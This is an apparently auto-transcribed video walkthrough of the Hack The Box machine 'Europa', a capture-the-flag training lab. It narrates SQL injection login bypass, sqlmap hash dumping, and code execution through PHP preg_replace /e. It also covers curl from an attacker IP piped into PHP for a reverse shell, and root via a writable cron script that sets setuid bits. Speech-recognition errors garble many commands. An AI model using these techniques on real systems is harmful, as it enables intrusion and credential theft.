 what's going on YouTube this is if SEC and only be doing the group of machine from hack the box this box was rated as easy I think it may be more of a medium box just because it requires programming insight to identify what Avery regular expression looks like and once you see that you can quickly find out the server is doing something really silly exploit it and get a shell but before I even get to the regular expressions there is some work to do so let's jump in instead of doing the boring old end map we're gonna use a tool called sparta I realize I always try to show different tools I never showed a different recon I normally don't use sparta just because it does so much and i'm a console cowboy I love having full control everything and doing exactly what's going to happen so just open up Sparta if you don't have this you can do apt insult install Sparta on Kali and we can add host to scoop the IP address is 10 10 10 22 once we add this to scoop it's gonna start kicking off a bunch of things the first thing is gonna be an ad map and then once this end map finishes its gonna do like Nick Doe if it's these web services other things if it's these other services the main issue I have with Sparta is the fact that it does all of this I've had cases where it identified like samba or something and attempted to do a brute force attack and locked accounts so that's why I like having fine control over everything the thing that Sparta does really well is keeps everything SuperDuper organized so we have results right here we can click on the host if we have multiple hosts they'd appear here we got a services tab so it's drawn HTTP things we saw have to finished and map stage 1 that's just a quick scan it starts and map stage 2 which takes a little bit longer and it's all 80 and 443 was open so it's stirred in Nick Doe against their sports and took HTTP screenshots so you can see how this comes in handy if you always want to have recon going in the background because it automatically stages all of your recon so you don't have to keep going back and adding new things so if we go to the services tab we should be able click on 443 and it should have identified this as SSL and lon had SSL options here but if we hold shift and right click 443 we can see everything it has so I'm going to do run SSL wise and kick that job off and I'm gonna do run as a cell scan because port 443 should have a certificate so we see SSL wise looks like it finished if we go over to the tools tab we can see that so we see the available plugins for that tool and if we scroll down we see subject alternative names wwu OPIC or HDB and admin portal dot EuropaCorp pH TB so those have been cheating because I knew if we just went here as we saw on the screenshot we've the patch Ubuntu default page the other thing I would have done is I would have probably right clicked and sent to doorbuster and then we can browse to a word list so we'll do user share with less do Buster and then sure directory list or something start that minimize it and if we go over the tools we now have door buster and we can see the output here so you can see how this comes in handy but again the key thing was looking at these subject alternative names SSL wise shows that and SSL scan shows that if you wanted to do it without at all the easiest way just go to HTTPS 10 10 10 20 to advanced to accept a certificate add exception view the certificate go over into the details if you clicked around you would see certificate subject alternative names and admin - portal euro for PhD B along with dub-dub-dub so copy this I'm sure we can show exactly what happens so if we turn intercept on go to this page except we have to turn burp on except because it's doing something called virtual host routing which means it examines the domain name and that identifies where you go on the server based upon the domain name so that works by just this host thing so at a host 10 10 10 22 the server is going to give us the at Apache default page if we change this host to admin dashboard or Europe or page TV we get a different page it's a 302 redirect to login dot PHP and we follow that it should come out watch what's going on there let's go oh unknown host so we follow the redirect it doesn't know how to get there so let's edit a host file to add that and then portal dot dot h TV and now when we could go I must have a typo that's weird it's definitely there close out go in the browser HGPS admin portal what am I doing wrong let's try to intercept off just refresh that works so I guess Boop is not picking up the hosts tab when I edit it so let's close out Bert open it back up and see if it fixes that that was a weird issue I don't care about that update and we can go back look at sparta it's still doing that dirt buster and now has launched and map Stage four so again stage one very few ports Stage two opens up a bit more Stage three probably run scripts staged for expired doing all ports we can see SSH is open on it so brick should be loaded and acept off proxy default okay now burp is recognizing my hosts entry I don't think I've ever seen that happen that was bizarre so okay everything is right in the world off so we can look at this so we get this login page the very first thing I do try admin password attempt to log in it says please enter an email address so we know there's some type of validation going on user side to not send that login request and just say hey that's not a mail so that's interesting I'm going to do admin at Europa HDB the reason I'm doing that is if we go back into the as a sell stuff we should see that email address in here as the contact europa scan does that show it I'm not sure on the output of those tools but if we right-click this is now going through ports wigger which is burp stable this so we can see the real certificate so we can see the real certificate is gang annoying but okay we see the real one if we go over into let's see the issuer we see admin at Europa htb so that's why I chose that email information you can get from SSL Certificates so just try like to pass where this password attempt to login get a failed cell I'm gonna send this over into repeater so we can easily play with it because I get annoyed when things clear my login form what if I click something cuz makes me real on set login server to repeater so this is what happens on a failed login attempt so let's just try the comment or one equals one there that didn't work so what I'm going to try to do and specifically because I saw them put some type of filtering in the email portion on user side I'm gonna answer an SQL injection here so we're gonna do pretty much the same thing except put it in the email and we get a 302 found if we follow the redirection we get in so what just happened why don't do the one equals one I probably could have in it may have worked but the longer request probably looks like select star from accounts where email equals email and password equals password so if there's no SQL injection this will only return one result when you have a valid email and password what we did was we changed email to be admin at Europa Corp HDB and then added in our own ' and then commented everything else out so it was just select star from accounts where email is admin at euro poco HTTP lets us in and if we added that or one equals one we probably wouldn't even need a valid email address it would just go to the very first email that works so if we tried this put an invalid email probably to kill a cookie this let's see raw grab this cookie because this one's not authenticated yet and we just try invalid email so we'll do upset got nowhere dotnet and we'll see if this logs us in it doesn't because this email doesn't exist but if we do if ii know annette or one equals one it probably log is in as admin or not see oh I thought that would have worked maybe not maybe I'm doing something wrong but if you want you can play around with that we're just gonna go with what we know works is admin at Europa Corp dot h DB and it logs us in follow the redirection and we get that so just I'm gonna cept off we get to the dashboard and since we know there's a SQL injection want to go back to my terminal we're gonna do SQL map go to burp HTTP history login you want to post that one I know I could copy the file but I don't know exactly where my boobs directory is and don't feel like specifying this I'm just gonna do it this way and then we'll do the spaces I'm gonna do SQL mapa login - request - - DBMS I think my sequel - P for parameter username that login email not found so he probably didn't find it because a PHP session is authenticated so let's go back into the repeater tab and grab one that is not so we get rid of the cookie grabs a new one go over back into a login request we paste not found why is this getting full force so let's try this again v copy cookie paste it oh I think I specified - - SSL or - SSL there we go nope that's not it oh that's cool map - age crap so - I SSL HTTPS oh there is a flag to force SSL it maybe - force SSL there we go - task force - has to sell so what was happening as SQL map was trying to go over port 80 I want to say no do SSL and there we go because we just go to admin portal without SSL I may have that cell anywhere yeah we get not found so that page only exists on the HTTPS side if you don't specify HTTPS it's that Apache - Ubuntu page so that was the issue I was having with sequel map looks like it's found it so we just hit enter a few times and it will start extracting data while we go we look at this web page almost everything here is doing nothing i'm clicking at these links and we can't do anything so nothing there we type stuff here nothing inputs so this page looks like a bust if we go over to the tools tab we see something odd and there's a squall map asks so what I'm gonna do is send this over into book and we look at what exactly happens actually before I do that we can just say it's AK and then click generate and we see the remote address replaces with emsac so what happens is this is a search and replace and it's replacing IP address with whatever we put here so now we inspect this traffic generate send this over to repeater and we see a lot of data so what I'm gonna do highlight all this I'm gonna press control-shift you so we're gonna HTTP decode this or your LD code and I forget which one that is Oh ctrl shift your LD code not page B but you roadie code that lets your L decode this and we see the pattern is IP address replace with EPS AK so if we change this to be like let's just say Vuitton zero and we can see if we can send this without rien coding it and uh yeah we can we see the vite on zero got replaced with hip sac so these slashes mean regular expressions so what I did was I went to Google and I did PHP regular expression danger and we have the unexpected dangers of preg rope replace so this is probably the function that they're using to do the regular expression and you scroll down let's see we can see them adding a /e and that means / expression and now you can do PHP code whereas that is so maybe hard to explain but it's easy to see so we add a e to the end of this slash and now we can do system Who am I and when we click go we get WWD da in the output where we had it set previously if that /e was not there it's just going to input system Who am I yeah so that's what the /e does I think it means slash expression but definitely read this blog post because it will explain everything better than I can what we're going to do is do a system call to curl I'm going to go to my IP address Oh real quick I'll just do - - dome on that SQL map see let's go start dumping things sure but we see it had dumped add Matt Europe equip this hash and we can google this to see if it D Crips there looks like md5 copy paste result for I'm d5 decrypt and see if it's in this robot images with cars I don't I see a car there traffic lights I hate CAPTCHAs there we go decrypt and this may be the password that is weird but anyways that's one of the benefits to always doing recon the background if we got stuck we may have potential passwords to get route and I want if that password may actually work let's just do it to hash this out org I know this doesn't ask me for CAPTCHA cuz I only actually say that I never tried to see if that's actually the valid password for root these G W Q o ND v decrypt as long super secret password that is the password for the account so always use hashes down to work for hashes always anyways I got sidetracked where was I no we have to get the shell so what I'm going to do is go into opt shells PHP and I'm going to use PHP reverse shell if you google pen test monkey and reverse shell you'll find the script and we're just gonna make sure it has my IP 10 10 14 for if config 10 10 14 4 so it's going to send a shell to this IP on port 8000 1 sounds good to me so Python damn simple HTTP server port 80 and we'll open a new thing and see LV NP 8000 1 go back in the book /e so if we curl HTTP 10 10 14 4 / PHP / shell dot PHP it's going to output all the contents if I pipe that to PHP it should execute got the request and got a shell so we're going to do Python - see employ PT y PT y dot spawn been bash Python I found Python 3 - see em put p2 y PT y dot spawn and bash got the shell background it sqi sighs do i - echo foreground - I rose 48 186 and then stty thing I haven't done in all my videos it's something I picked up recently and makes just a terminal appear better if we Viet see passwd it looks a bit better watch the epochal astray do if you want to see what happens with that process but anyways let's do Lin enum now so I'm going to minimize that let's change where oh we can leave it there actually and just do another split and we're going to go to opt when prove asked and I'm going to do lynnie numbness H so python m simple HTTP server 81 well listen on so I can do curl 1010 14 for 81 when SH and it just outputs that scan it doesn't actually execute anything but if we pipe that to bash or Sh it will start executing so let this finish take too long you can see the exploit on the screen right now that is the interesting thing is what will let it finish and go over it let's go back to SQL map did finish so go to the top so we can see the colonel's 2017 of June probably no prove that since then it's Ubuntu xenial 1604 dot to writing as www.shawnacoronado.com so we're gonna look into that and first I want to su sudo John still have that here super secret password super secret password nope that's not the password for John and not the password for root so let's take a look at what that one script we copied was so CD over there LS - that way we see root owns it's not writable so let's view that file and we see it's another PHP script and it is calling log cleared Sh I don't know why just copy that it's in dub dub dub CMD let's - that way log cleared SH is owned by www.vitac.com the server if someone was on it before they may have not removed it so if you look at the directory permissions you see that WWWE is the group owner of that folder and the group is writable so we can write in here so if we V log cleared SH we can execute commands here so we could do something like chmod for 755 add the sticky bit to pin OS uh yes and then every minute it was executing so if we do an LS al or LA on ten last now the sticky bit or not sticky set UID bit has been added I don't know why we call that sticky but set UID bit has been added so now when we do less it can switch to the root users context and let us do things like view the Etsy shadow file where we could view root root text and get the pass that way if we want to get a full shell we could upload a set UID binary we'll just go to pen test monkey reverse shell and we will use this one cuz this always works as he always works like 99% of time this one works and other ones don't so it's just the most reliable one I found on that site change this to ten ten 1014 for du port 8000 - and we can split this again and CoV NP 8,000 - and it should run in about 30 seconds so we'll see if that happens and if it does then huzzah if not we'll have to do a little bit of troubleshooting so about 15 seconds left go back over in Sparta we can look it is still running dirt Buster but all the nmap finished we go to do a Buster and still just searching directories and it did not send us the shell that was unique Oh Ellis - Oh a chmod plus x to make this executable well cleared Sh that script has to be executable there we go so we wait another 30 seconds and then we get root and this machine is done hopefully deep 20 seconds left fifteen seconds so should be in three two one shell there we go if we do ID we are now root and we can see D / root cat root text and get the flag so that is the box hope you guys enjoyed the video and take care